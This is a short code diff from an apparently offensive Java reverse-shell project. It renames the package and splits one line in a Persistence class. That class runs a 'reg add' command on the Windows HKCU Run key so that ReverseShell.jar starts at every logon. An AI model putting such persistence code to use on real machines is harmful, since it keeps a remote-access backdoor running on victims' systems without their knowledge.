@@ -1,4 +1,4 @@
-package obs1d1anc1ph3r.reverseshell.utils;
+package obs1d1anc1ph3r.reverseshell.client.utils;
 
 import java.io.IOException;
 import java.nio.file.Files;
@@ -20,7 +20,8 @@ public class Persistence {
 	public static void addToRegistry() {
 		try {
 			String command = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ReverseShell /t REG_SZ /d \"java -jar path\\to\\ReverseShell.jar\" /f";
-			Process process = Runtime.getRuntime().exec(command);
+			Process process;
+			process = Runtime.getRuntime().exec(command);
 			process.waitFor();
 			System.out.println("[*] Persistence set via Windows Registry");
 		} catch (IOException | InterruptedException e) {
